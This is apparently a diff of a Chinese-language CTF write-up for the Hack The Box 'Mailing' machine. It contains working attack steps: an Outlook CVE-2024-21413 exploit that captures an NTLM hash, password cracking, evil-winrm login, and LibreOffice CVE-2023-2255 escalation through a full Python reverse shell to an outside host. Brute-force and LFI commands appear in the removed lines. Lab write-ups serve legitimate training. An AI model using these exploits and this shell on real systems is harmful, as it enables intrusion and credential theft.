@@ -227,30 +227,175 @@ Internal=1
 来到[这个解密网站](https://crackstation.net/)，解出来密码是：homenetworkingadministrator
 
 
-使用[这个exp](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)
+使用[这个exp](https://github.com/CMNatic/CVE-2024-21413/blob/main/exploit.py)
+
+
+修改
+
+![](Mailing_files/3.jpg)
+
+执行
+
+![](Mailing_files/2.jpg)
 
 
 
-python CVE-2024-21413.py --server mailing.htb --port 587 --username Administrator@mailing.htb --password homenetworkingadministrator --sender Administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.25\test\meeting" --subject "hi"
+接收到
+```
+┌──(root㉿kali)-[~]
+└─# impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.14,54004)
+[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+[*] User MAILING\maya authenticated successfully
+[*] maya::MAILING:aaaaaaaaaaaaaaaa:121da680f21baadfb0d4791ac82784a0:0101000000000000002e5564f0cdda013dda050c5c9896da00000000010010004d0067004a0062004c00460042006200030010004d0067004a0062004c00460042006200020010006b007a00540068007900650054004500040010006b007a0054006800790065005400450007000800002e5564f0cdda0106000400020000000800300030000000000000000000000000200000597c78448c1dc55d9b39619495d6e6f93e226810084b2cad916b464304b4d47d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330033000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:test)
+[*] NetrGetShareInfo Level: 1
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:test)
+[*] Closing down connection (10.10.11.14,54004)
+[*] Remaining connections []
+
+```
 
 
-python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.16.25\PoC' --subject "Hello world"
+
+破解后得到明文密码
+```
+┌──(root㉿kali)-[~/htb/Mailing]
+└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:04 DONE (2024-07-04 05:01) 0.2375g/s 1409Kp/s 1409Kc/s 1409KC/s m61405..m4895621
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+登录
+```
+┌──(root㉿kali)-[~/htb/Mailing]
+└─# evil-winrm -i 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents> whoami
+mailing\maya
+
+```
+
+
+# 提权
+
+在这个路径找到一个软件
+```
+*Evil-WinRM* PS C:\Program Files\LibreOffice\readmes> type readme_es.txt
+
+
+======================================================================
+
+LÃ©ame de LibreOffice 7.4
+
+======================================================================
+
+```
+
+使用[CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)
+
+生成exploit.odt
+```
+python3 CVE-2023-2255.py --cmd "python C:\Users\maya\Desktop\shell.py" --output 'exploit.odt'
+```
+
+
+shell.py
+```
+#shell.py
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
  
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
  
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.16.33",443))
+ 
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+ 
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+ 
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+ 
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
 
+```
 
+shell.py上传到C:\Users\maya\Desktop\
 
-hydra -l maya -P /usr/share/wordlists/rockyou.txt -f -v  smtp://10.10.11.14
+exploit.odt上传到C:\Important Documents
 
-crackmapexec winrm 10.10.11.14  -u maya -p /usr/share/wordlists/rockyou.txt
+等待一段时间
+```
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.14] 64551
+Microsoft Windows [Version 10.0.19045.4355]
+(c) Microsoft Corporation. All rights reserved.
 
+C:\Program Files\LibreOffice\program>whoami
+whoami
+mailing\localadmin
 
-g.smith
+```
 
-Thunderbird 115.8.1
+root.txt
+```
+c:\Users\localadmin\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9502-BA18
 
-CVE-2024-1936
-dig txt mailing.htb | grep spf
+ Directory of c:\Users\localadmin\Desktop
 
+2024-04-12  06:10 AM    <DIR>          .
+2024-04-12  06:10 AM    <DIR>          ..
+2024-02-27  05:30 PM             2,350 Microsoft Edge.lnk
+2024-07-05  04:27 AM                34 root.txt
+               2 File(s)          2,384 bytes
+               2 Dir(s)   4,518,281,216 bytes free
 
-wfuzz -c -w ./lfi2.txt --hw 0 http://mailing.htb/download.php?file=../../../../../../../FUZZ
+c:\Users\localadmin\Desktop>type root.txt
+type root.txt
+62837f9b0f544dee9404f1bc196fec7c
+
+```
